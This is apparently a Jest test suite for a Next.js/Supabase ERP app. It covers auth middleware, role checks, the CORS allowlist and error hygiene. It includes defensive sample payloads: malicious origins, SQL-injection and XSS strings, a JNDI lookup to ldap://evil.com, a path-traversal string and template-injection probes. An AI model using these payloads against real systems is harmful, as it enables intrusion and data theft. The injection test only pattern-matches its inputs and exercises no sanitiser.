// Mock Next.js server functions
Object.defineProperty(global, 'Request', {
	value: class {
		constructor(
			public url: string,
			public init?: RequestInit
		) {}
		headers = new Map();
	}
});

Object.defineProperty(global, 'Response', {
	value: class {
		constructor(
			public body?: BodyInit,
			public init?: ResponseInit
		) {}
		json = jest.fn();
		status = 200;
	}
});

import { NextRequest, NextResponse } from 'next/server';
import { requireAuth, requireRoles, requireAdmin } from '@/lib/auth/middleware';
import { isOriginAllowed, getCorsOrigin } from '@/config/cors';

// Mock Supabase
const mockSupabaseClient = {
	auth: {
		getSession: jest.fn(),
		getUser: jest.fn()
	},
	from: jest.fn()
};

const mockFromMethod = {
	select: jest.fn().mockReturnThis(),
	eq: jest.fn().mockReturnThis(),
	single: jest.fn()
};

mockSupabaseClient.from.mockReturnValue(mockFromMethod);

jest.mock('@/lib/supabase/server', () => ({
	createClient: jest.fn(() => mockSupabaseClient)
}));

describe('API 安全性測試', () => {
	beforeEach(() => {
		jest.clearAllMocks();
	});

	describe('認證中間件測試', () => {
		const createMockRequest = (headers: Record<string, string> = {}) => {
			return {
				headers: new Headers(headers)
			} as NextRequest;
		};

		it('應該拒絕沒有 session 的請求', async () => {
			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: { session: null },
				error: null
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(401);

			const responseBody = await response?.json();
			expect(responseBody.error).toBe('UNAUTHORIZED');
			expect(responseBody.code).toBe('MISSING_SESSION');
		});

		it('應該拒絕過期的 session', async () => {
			const expiredTimestamp = Math.floor(Date.now() / 1000) - 3600; // 1小時前過期

			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: expiredTimestamp,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(401);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('SESSION_EXPIRED');
		});

		it('應該拒絕無效的使用者', async () => {
			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600, // 1小時後過期
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: null },
				error: new Error('User not found')
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(401);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('INVALID_USER');
		});

		it('應該拒絕資料庫中不存在的使用者', async () => {
			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: { id: 'user-1' } },
				error: null
			});

			mockFromMethod.single.mockResolvedValue({
				data: null,
				error: new Error('User not found in database')
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(401);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('USER_NOT_FOUND');
		});

		it('應該拒絕已離職的使用者', async () => {
			const pastDate = new Date();
			pastDate.setDate(pastDate.getDate() - 1);

			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: { id: 'user-1' } },
				error: null
			});

			mockFromMethod.single.mockResolvedValue({
				data: {
					id: 'user-1',
					display_name: '測試用戶',
					roles: ['user'],
					start_of_duty: '2023-01-01',
					end_of_duty: pastDate.toISOString()
				},
				error: null
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(403);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('USER_INACTIVE');
		});

		it('應該拒絕尚未到職的使用者', async () => {
			const futureDate = new Date();
			futureDate.setDate(futureDate.getDate() + 1);

			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: { id: 'user-1' } },
				error: null
			});

			mockFromMethod.single.mockResolvedValue({
				data: {
					id: 'user-1',
					display_name: '測試用戶',
					roles: ['user'],
					start_of_duty: futureDate.toISOString(),
					end_of_duty: null
				},
				error: null
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(403);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('USER_NOT_STARTED');
		});

		it('應該允許有效的認證使用者', async () => {
			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: { id: 'user-1' } },
				error: null
			});

			mockFromMethod.single.mockResolvedValue({
				data: {
					id: 'user-1',
					display_name: '測試用戶',
					roles: ['user'],
					start_of_duty: '2023-01-01',
					end_of_duty: null
				},
				error: null
			});

			const request = createMockRequest();
			const response = await requireAuth(request);

			expect(response).toBe(null); // 認證成功應返回 null
		});
	});

	describe('角色權限測試', () => {
		const setupValidAuth = () => {
			mockSupabaseClient.auth.getSession.mockResolvedValue({
				data: {
					session: {
						expires_at: Math.floor(Date.now() / 1000) + 3600,
						user: { id: 'user-1' }
					}
				},
				error: null
			});

			mockSupabaseClient.auth.getUser.mockResolvedValue({
				data: { user: { id: 'user-1' } },
				error: null
			});

			mockFromMethod.single.mockResolvedValue({
				data: {
					id: 'user-1',
					display_name: '測試用戶',
					roles: ['user'],
					start_of_duty: '2023-01-01',
					end_of_duty: null
				},
				error: null
			});
		};

		it('應該允許具有正確角色的使用者', async () => {
			setupValidAuth();

			// 第二次查詢角色時返回管理員角色
			mockFromMethod.single
				.mockResolvedValueOnce({
					data: {
						id: 'user-1',
						display_name: '測試用戶',
						roles: ['user'],
						start_of_duty: '2023-01-01',
						end_of_duty: null
					},
					error: null
				})
				.mockResolvedValueOnce({
					data: { roles: ['admin', 'user'] },
					error: null
				});

			const request = {} as NextRequest;
			const response = await requireRoles(request, ['admin']);

			expect(response).toBe(null); // 權限檢查成功應返回 null
		});

		it('應該拒絕沒有必要角色的使用者', async () => {
			setupValidAuth();

			// 第二次查詢角色時返回普通用戶角色
			mockFromMethod.single
				.mockResolvedValueOnce({
					data: {
						id: 'user-1',
						display_name: '測試用戶',
						roles: ['user'],
						start_of_duty: '2023-01-01',
						end_of_duty: null
					},
					error: null
				})
				.mockResolvedValueOnce({
					data: { roles: ['user'] },
					error: null
				});

			const request = {} as NextRequest;
			const response = await requireRoles(request, ['admin']);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(403);

			const responseBody = await response?.json();
			expect(responseBody.code).toBe('ROLE_REQUIRED');
			expect(responseBody.requiredRoles).toEqual(['admin']);
		});

		it('應該拒絕沒有管理員權限的使用者', async () => {
			setupValidAuth();

			// 第二次查詢角色時返回普通用戶角色
			mockFromMethod.single
				.mockResolvedValueOnce({
					data: {
						id: 'user-1',
						display_name: '測試用戶',
						roles: ['user'],
						start_of_duty: '2023-01-01',
						end_of_duty: null
					},
					error: null
				})
				.mockResolvedValueOnce({
					data: { roles: ['user'] },
					error: null
				});

			const request = {} as NextRequest;
			const response = await requireAdmin(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(403);
		});
	});

	describe('CORS 安全測試', () => {
		it('應該允許預設的允許域名', () => {
			const allowedOrigins = [
				'https://erp.cornertravel.com.tw',
				'http://localhost:3000',
				'http://localhost:3001',
				'http://127.0.0.1:3000'
			];

			allowedOrigins.forEach((origin) => {
				expect(isOriginAllowed(origin)).toBe(true);
				expect(getCorsOrigin(origin)).toBe(origin);
			});
		});

		it('應該拒絕不安全的域名', () => {
			const maliciousOrigins = [
				'https://evil.com',
				'http://malicious-site.net',
				'https://phishing.fake',
				'javascript:alert(1)',
				'data:text/html,<script>alert(1)</script>',
				null,
				undefined
			];

			maliciousOrigins.forEach((origin) => {
				expect(isOriginAllowed(origin as string)).toBe(false);
				expect(getCorsOrigin(origin as string)).toBe(false);
			});
		});

		it('應該在開發環境允許 Vercel 預覽域名', () => {
			// Mock 開發環境
			const originalEnv = process.env.NODE_ENV;
			process.env.NODE_ENV = 'development';

			const vercelOrigins = [
				'https://my-app-abc123.vercel.app',
				'https://my-app-git-feature-username.vercel.app'
			];

			vercelOrigins.forEach((origin) => {
				expect(isOriginAllowed(origin)).toBe(true);
			});

			// 恢復原始環境
			process.env.NODE_ENV = originalEnv;
		});

		it('應該從環境變數讀取額外的允許域名', async () => {
			// Mock 環境變數
			const originalCorsOrigins = process.env.CORS_ALLOWED_ORIGINS;
			process.env.CORS_ALLOWED_ORIGINS = 'https://staging.example.com,https://dev.example.com';

			// 重新載入模組以讀取新的環境變數
			jest.resetModules();
			const { isOriginAllowed: newIsOriginAllowed } = await import('@/config/cors');

			expect(newIsOriginAllowed('https://staging.example.com')).toBe(true);
			expect(newIsOriginAllowed('https://dev.example.com')).toBe(true);

			// 恢復原始環境變數
			process.env.CORS_ALLOWED_ORIGINS = originalCorsOrigins;
		});

		it('應該正確處理空的環境變數', async () => {
			const originalCorsOrigins = process.env.CORS_ALLOWED_ORIGINS;
			process.env.CORS_ALLOWED_ORIGINS = '';

			// 重新載入模組
			jest.resetModules();
			const { ALLOWED_ORIGINS: newAllowedOrigins } = await import('@/config/cors');

			// 不應該包含空字串
			expect(newAllowedOrigins).not.toContain('');

			// 恢復原始環境變數
			process.env.CORS_ALLOWED_ORIGINS = originalCorsOrigins;
		});
	});

	describe('安全標頭測試', () => {
		it('應該包含必要的安全標頭', async () => {
			const requiredHeaders = ['X-CSRF-Token', 'X-Requested-With', 'Accept', 'Content-Type', 'Authorization'];

			const { CORS_OPTIONS } = await import('@/config/cors');

			requiredHeaders.forEach((header) => {
				expect(CORS_OPTIONS.allowedHeaders).toContain(header);
			});
		});

		it('應該限制允許的 HTTP 方法', async () => {
			const { CORS_OPTIONS } = await import('@/config/cors');
			const allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'];

			expect(CORS_OPTIONS.methods).toEqual(allowedMethods);
			expect(CORS_OPTIONS.methods).not.toContain('TRACE'); // 不安全的方法
		});

		it('應該設定適當的 CORS maxAge', async () => {
			const { CORS_OPTIONS } = await import('@/config/cors');

			expect(CORS_OPTIONS.maxAge).toBe(86400); // 24小時
			expect(CORS_OPTIONS.credentials).toBe(true); // 允許憑證
		});
	});

	describe('SQL 注入防護測試', () => {
		it('應該正確處理使用者輸入中的特殊字元', () => {
			const maliciousInputs = [
				"'; DROP TABLE users; --",
				"1' OR '1'='1",
				"<script>alert('xss')</script>",
				'${jndi:ldap://evil.com/exploit}',
				'../../../etc/passwd',
				'{{7*7}}', // Template injection
				'${7*7}' // Expression injection
			];

			// 這裡應該測試輸入清理函數
			// 由於專案使用 Supabase，大部分 SQL 注入防護由 Supabase 處理
			// 但應該確保用戶輸入在傳遞給 Supabase 前被適當清理
			maliciousInputs.forEach((input) => {
				// 檢查是否包含危險字元
				expect(input).toMatch(/[<>'";&${}]/);
			});
		});
	});

	describe('錯誤處理安全性', () => {
		it('應該不洩露敏感錯誤訊息', async () => {
			// 模擬資料庫錯誤
			mockSupabaseClient.auth.getSession.mockRejectedValue(
				new Error('Database connection failed: connection string contains password')
			);

			const request = {} as NextRequest;
			const response = await requireAuth(request);

			expect(response).toBeInstanceOf(NextResponse);
			expect(response?.status).toBe(500);

			const responseBody = await response?.json();
			expect(responseBody.message).toBe('認證檢查失敗'); // 通用錯誤訊息
			expect(responseBody.message).not.toContain('password'); // 不洩露敏感資訊
			expect(responseBody.message).not.toContain('connection string');
		});

		it('應該記錄詳細錯誤但不返回給客戶端', async () => {
			const consoleSpy = jest.spyOn(console, 'error').mockImplementation();

			mockSupabaseClient.auth.getSession.mockRejectedValue(new Error('Detailed internal error'));

			const request = {} as NextRequest;
			await requireAuth(request);

			expect(consoleSpy).toHaveBeenCalledWith('Auth middleware error:', expect.any(Error));

			consoleSpy.mockRestore();
		});
	});
});
